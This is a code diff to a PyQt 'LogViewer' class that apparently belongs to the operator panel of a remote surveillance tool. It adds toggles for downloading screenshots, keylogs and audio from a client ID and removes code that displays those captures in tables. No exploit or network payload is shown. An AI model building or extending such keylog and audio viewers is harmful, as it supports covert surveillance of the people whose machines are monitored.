@@ -177,6 +177,9 @@ class LogViewer(QWidget, logViewerUi):
     def download_logs(self):
         self.update_date()
         download_info = {
+            'screenshot': self.screenshotsEnableButton.isChecked(),
+            'keylog': self.keylogsEnableButton.isChecked(),
+            'audio': self.audioEnableButton.isChecked(),
             'filter': self.ignoreViewedCheck.isChecked(),
             'client_id': self.client_id,
             'date': self.date,
@@ -326,96 +329,4 @@ class LogViewer(QWidget, logViewerUi):
             self.downloaded_screenshots = 0
             self.downloaded_keylogs = 0
             self.downloaded_audios = 0
-
-    def update_tables(self, tab_index):
-
-        self.logsTab.setCurrentIndex(tab_index)
-
-        if len(self.screenshots_dict) > 0:
-            self.screenshotsTable.setRowCount(len(self.screenshots_dict))
-            self.screenshotsTable.setColumnWidth(0, 180)
-            for index, key in enumerate(self.screenshots_dict):
-                self.gui()
-
-                # add screenshot preview
-                im = self.screenshots_dict[key]['path']
-                image = QImage(im)
-                pixmap = QPixmap.fromImage(image)
-                previews_dict = QLabel()
-                previews_dict.setPixmap(pixmap.scaled(200, 200, Qt.KeepAspectRatio))
-                previews_dict.setScaledContents(True)
-                self.screenshotsTable.setCellWidget(index, 0, previews_dict)
-
-                # add screenshot information
-                payload = '''
-                <p align="center"><font color="#e67e22">%s</font></p>
-                %s
-                ''' % (self.screenshots_dict[key]['datetime'], self.screenshots_dict[key]['window_title'])
-                infoText = QTextEdit()
-                infoText.setReadOnly(True)
-                infoText.setStyleSheet('background: #2c3e50;\nborder: 1px ridge;\nborder-color: #2c3e50;\nborder-top: none;\npadding: 3px;')
-                infoText.insertHtml(payload)
-                self.screenshotsTable.setCellWidget(index, 1, infoText)
-
-                # add path
-                item = QTableWidgetItem(self.screenshots_dict[key]['path'])
-                self.screenshotsTable.setItem(index, 2, item)
-
-        if len(self.keylogs_dict) > 0:
-            self.keylogsTable.setRowCount(len(self.keylogs_dict))
-            for index, key in enumerate(self.keylogs_dict):
-                self.gui()
-
-                # add date
-                item = QTableWidgetItem(self.keylogs_dict[key]['datetime'])
-                item.setTextColor(QColor('#f39c12'))
-                self.keylogsTable.setItem(index, 0, item)
-
-                # add log preview
-                log = open(self.keylogs_dict[key]['path'], 'r').readline()
-                html_snippets = ['<p align="center" style="background-color: #34495e;color: #ecf0f1;">',
-                                '<br>',
-                                '<font color="#e67e22">',
-                                '</font>',
-                                '</p>']
-                for i in html_snippets:
-                    log = log.replace(i, '')
-                item = QTableWidgetItem(log.decode('utf-8'))
-                self.keylogsTable.setItem(index, 1, item)
-
-                # add path
-                item = QTableWidgetItem(self.keylogs_dict[key]['path'])
-                self.keylogsTable.setItem(index, 2, item)
-
-        if len(self.audio_dict) > 0:
-            self.audioTable.setRowCount(len(self.audio_dict))
-            for index, key in enumerate(self.audio_dict):
-                self.gui()
-
-                # add audio duration
-                item = QTableWidgetItem(audio_duration(self.audio_dict[key]['path']))
-                item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
-                item.setTextColor(QColor('#16a085'))
-                self.audioTable.setItem(index, 0, item)
-
-                # add screenshot preview
-                generated_spectrum = spectrum_analyzer_image(self.client_id,
-                                                             self.audio_dict[key]['path'],
-                                                             self.audio_dict[key]['datetime'],
-                                                             self.selected_dir)
-                image = QImage(generated_spectrum)
-                pixmap = QPixmap.fromImage(image)
-                spectrum_image = QLabel()
-                spectrum_image.setStyleSheet('background: none;')
-                spectrum_image.setPixmap(pixmap)
-                self.audioTable.setCellWidget(index, 1, spectrum_image)
-
-                # add date time
-                item = QTableWidgetItem(self.audio_dict[key]['datetime'])
-                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
-                item.setTextColor(QColor('#f39c12'))
-                self.audioTable.setItem(index, 2, item)
-
-                # add path
-                item = QTableWidgetItem(self.audio_dict[key]['path'])
-                self.audioTable.setItem(index, 3, item)
+            self.check_data_counts()
